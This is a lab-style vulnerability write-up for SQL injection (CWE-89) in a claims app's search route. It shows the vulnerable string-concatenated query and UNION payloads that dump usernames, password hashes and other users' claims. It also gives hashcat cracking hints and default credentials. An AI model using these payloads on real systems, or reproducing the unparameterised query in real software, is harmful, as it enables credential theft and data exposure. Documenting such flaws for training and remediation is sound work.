# Privilege Escalation 2 — SQL Injection

**CWE:** [CWE-89](https://cwe.mitre.org/data/definitions/89.html) — Improper Neutralisation of Special Elements used in an SQL Command ('SQL Injection')

---

## Vulnerability Summary

The claims search function (`/search-claims`) concatenates user input directly into a raw SQL query without parameterisation or sanitisation. An authenticated normal staff user can inject SQL to extract data from other tables — including other users' claims or user credentials from the `users` table.

### Vulnerable Code

**`app.py` — `/search-claims` route:**
```python
# User input directly concatenated into the SQL string
raw_query = "SELECT * FROM claims WHERE user_id = " + str(current_user.id) \
            + " AND (title LIKE '%" + search_query \
            + "%' OR description LIKE '%" + search_query \
            + "%') ORDER BY created_at DESC"
```

---

## Database Schema Reference

**`claims` table — 12 columns:**

| # | Column             | Type     |
|---|--------------------|----------|
| 1 | `id`               | Integer  |
| 2 | `user_id`          | Integer  |
| 3 | `claim_type_id`    | Integer  |
| 4 | `title`            | String   |
| 5 | `description`      | Text     |
| 6 | `amount`           | Float    |
| 7 | `status`           | String   |
| 8 | `additional_details` | Text   |
| 9 | `created_at`       | DateTime |
|10 | `updated_at`       | DateTime |
|11 | `reviewed_by`      | Integer  |
|12 | `review_notes`     | Text     |

**`users` table — 6 columns:**

| # | Column          | Type     |
|---|-----------------|----------|
| 1 | `id`            | Integer  |
| 2 | `username`      | String   |
| 3 | `email`         | String   |
| 4 | `password_hash` | String   |
| 5 | `role`          | String   |
| 6 | `created_at`    | DateTime |

---

## Exploitation Steps

### Step 1 — Log in as a normal staff user

```
Username: staff_user
Password: staff_pass
```

### Step 2 — Navigate to the search page

Go to **Search Claims** (`/search-claims`).

### Step 3 — Determine the column count

To perform a `UNION`-based injection, the number of columns in the injected `SELECT` must match the original query (12 columns). Confirm this by testing:

```
' UNION SELECT null,null,null,null,null,null,null,null,null,null,null,null --
```

If the page loads without a "Query error" flash message, the column count is correct.

### Step 4 — Extract user credentials

Enter the following payload in the search box:

```
' UNION SELECT id, username, email, password_hash, role, null, null, null, null, null, null, null FROM users --
```

This maps the `users` table columns to the output positions the template renders:

| Template column | Displays       | `users` value     |
|-----------------|----------------|-------------------|
| ID (`row[0]`)   | User ID        | `id`              |
| Title (`row[3]`)| **Username**   | `username`        |
| Amount (`row[5]`)| **Password hash** | `password_hash` |
| Status (`row[6]`)| **Role**       | `role`            |
| Submitted (`row[7]`)| Email     | (not mapped here) |

> Note: The `password_hash` values are Werkzeug hashed passwords (e.g., `scrypt:32768:8:1$...`). Use an offline hash cracker (e.g., hashcat with mode 25600 for Werkzeug scrypt) to recover plaintext passwords.

### Step 5 — Extract all claims from other users

```
' UNION SELECT id, user_id, claim_type_id, title, description, amount, status, additional_details, created_at, updated_at, reviewed_by, review_notes FROM claims WHERE user_id != 1 --
```

This returns claims belonging to all other users.

### Step 6 — Log in as the OIC user

Once the OIC password hash is cracked, log in at `/login` with the recovered credentials to gain full OIC privileges.

**Default OIC credentials (for reference):**
```
Username: oic_admin
Password: oic_admin_pass
```

---

## Impact

- **Credential theft** — extract password hashes from the `users` table and crack them offline.
- **Data exfiltration** — read all claims from other users, bypassing the per-user access restriction.
- **Privilege escalation** — use stolen OIC credentials to log in and perform privileged actions (approve/reject claims, manage claim types, edit notification templates).

---

## Root Cause

User-supplied search input is concatenated directly into a SQL string passed to `db.session.execute(db.text(raw_query))`. No parameterised queries or ORM filtering is used.
